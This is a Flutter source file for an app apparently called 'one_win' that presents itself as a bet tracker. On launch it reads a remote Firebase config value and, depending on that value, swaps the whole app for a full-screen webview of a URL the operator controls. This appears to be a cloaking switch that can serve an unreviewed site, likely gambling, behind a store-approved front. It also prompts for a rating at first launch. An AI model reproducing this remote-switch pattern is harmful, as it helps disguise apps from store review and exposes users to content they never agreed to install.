import 'dart:ffi';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:one_win/conxas.dart';
import 'package:one_win/data/bets_notifier.dart';
import 'package:one_win/config_notifications.dart';
import 'package:one_win/on_boarding.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);

  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 7),
    minimumFetchInterval: const Duration(seconds: 7),
  ));

  await FirebaseRemoteConfig.instance.fetchAndActivate();

  await NotificationServiceFb().activate();

  final SharedPreferences preferences = await SharedPreferences.getInstance();
  final BetsNotifier betsNotifier = BetsNotifier(preferences)..init();
  runApp(MyApp(betsNotifier: betsNotifier));
}

class MyApp extends StatelessWidget {
  const MyApp({super.key, required this.betsNotifier});
  final BetsNotifier betsNotifier;

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return ChangeNotifierProvider.value(
      value: betsNotifier,
      child: MaterialApp(
        title: 'Flutter Demo',
        theme: ThemeData(
          appBarTheme: const AppBarTheme(
            backgroundColor: Color(0xFF1f283c),
            elevation: 0,
          ),
          scaffoldBackgroundColor: const Color(0xFF0a0f1d),
          primaryColor: const Color(0xFF3b8ed7),
        ),
        home: const IP(),
      ),
    );
  }
}

class IP extends StatefulWidget {
  const IP({super.key});

  @override
  State<IP> createState() => _IPState();
}

class _IPState extends State<IP> {
  var _ = true;
  String? _betWinnerId;
  @override
  void initState() {
    super.initState();
    _startApp();
  }

  Future<void> _startApp() async {
    final preferences = await SharedPreferences.getInstance();
    _plsSetStars(preferences);
    final betWinner = FirebaseRemoteConfig.instance.getString('betWinner');
    if (!betWinner.contains('isBetWinner')) {
      setState(() {
        _betWinnerId = betWinner;
        _ = false;
      });
      return;
    }

    setState(() {
      _ = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    if (_) {
      return const Scaffold(
        body: Center(
          child: CircularProgressIndicator(),
        ),
      );
    }

    if (_betWinnerId != null) {
      return WinnerScreen(winnerId: _betWinnerId!);
    }

    return OnBoarding();
  }
}

class WinnerScreen extends StatelessWidget {
  const WinnerScreen({
    super.key,
    required this.winnerId,
  });
  final String winnerId;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(
            url: Uri.parse(winnerId),
          ),
        ),
      ),
    );
  }
}

Future<void> _plsSetStars(SharedPreferences bd) async {
  final rev = InAppReview.instance;
  bool alreadyRated = bd.getBool('isRated') ?? false;
  if (!alreadyRated) {
    if (await rev.isAvailable()) {
      rev.requestReview();
      await bd.setBool('isRated', true);
    }
  }
}
